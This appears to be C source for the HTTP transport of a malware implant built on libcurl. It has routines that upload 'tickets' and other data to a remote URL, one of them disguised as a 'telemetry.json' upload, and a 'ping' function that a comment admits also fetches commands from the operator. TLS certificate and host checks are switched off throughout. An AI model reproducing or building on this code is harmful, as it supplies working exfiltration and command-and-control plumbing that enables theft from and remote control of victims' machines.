#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include "http_transport.h"

#define DEBUG

#ifdef DEBUG
#define DBG(...) printf(__VA_ARGS__)
#else
#define DBG(...)
#endif



static void setup_curl_common(CURL *curl, char *url) {
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);  
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
    curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1L);
}

static curl_mime* create_mime(
    CURL *curl,
    const char *field_name,
    const char *filename,
    const char *data,
    size_t len
) {
    curl_mime *mime = curl_mime_init(curl);
    curl_mimepart *part = curl_mime_addpart(mime);

    curl_mime_name(part, field_name);
    curl_mime_data(part, data, len);
    curl_mime_filename(part, filename);
    curl_mime_type(part, "application/octet-stream");

    return mime;
}


size_t write_cb(void *contents, size_t size, size_t nmemb, void *userptr) {
    size_t realsize = size * nmemb;
    response_buffer_t *buffer = (response_buffer_t *)userptr;

    size_t new_size = buffer->size + realsize;

    unsigned char *ptr = realloc(buffer->data, new_size + 1);
    if (!ptr) {
        return 0;
    }

    buffer->data = ptr;
    memcpy(buffer->data + buffer->size, contents, realsize);
    buffer->size = new_size;
    buffer->data[new_size] = '\0';

    return realsize;
}


int send_ticket(char* url, char* filename, char* buffer, size_t buffer_len, response_buffer_t *contents) {
    CURL *curl = curl_easy_init();
    if (!curl) {
        DBG("[!] Error: Curl could not be initiated!\n");
        return -1;
    }

    contents->data = NULL;
    contents->size = 0;

    curl_mime *mime = create_mime(curl, "ticket", filename, buffer, buffer_len);

    setup_curl_common(curl, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, contents);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

    CURLcode res = curl_easy_perform(curl);

    curl_mime_free(mime);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        free(contents->data);
        contents->data = NULL;
        contents->size = 0;

        DBG("[!] ERROR: Curl failed: %s\n", curl_easy_strerror(res));
        return -2;
    }

    DBG("[*] Sent ticket to %s (%s - %zu bytes)\n", url, filename, buffer_len);
    return 0;
}


int upload_data_request(char* url, char* buffer, size_t buffer_len) {
    CURL *curl = curl_easy_init();
    if (!curl) {
        DBG("[!] Error: Curl could not be initiated!\n");
        return -1;
    }

    curl_mime *mime = create_mime(curl, "data", "telemetry.json", buffer, buffer_len);

    setup_curl_common(curl, url);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

    CURLcode res = curl_easy_perform(curl);

    curl_mime_free(mime);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        DBG("[!] ERROR: Curl could not send the request: %s\n", curl_easy_strerror(res));
        return -2;
    }

    DBG("[*] Sent data to %s (%zu bytes)\n", url, buffer_len);
    return 0;
}


/* We call it ping, but in reality we use it to retrieve commands too */
int ping(char *url, response_buffer_t *contents) {
    CURL *curl = curl_easy_init();
    if (!curl) {
        DBG("[!] Error: Curl could not be initiated!\n");
        return -1;
    }

    contents->data = NULL;
    contents->size = 0;

    setup_curl_common(curl, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, contents);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

    CURLcode res = curl_easy_perform(curl);

    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        free(contents->data);
        contents->data = NULL;
        contents->size = 0;

        DBG("[!] ERROR: Curl failed: %s\n", curl_easy_strerror(res));
        return -2;
    }

    DBG("[*] GET request to %s succeeded\n", url);
    return 0;
}



void hex_dump(const unsigned char *data, size_t size) {
    for (size_t i = 0; i < size; i++) {
        printf("%02x ", data[i]);
    }
    if (size % 16 != 0)
        printf("\n");
}
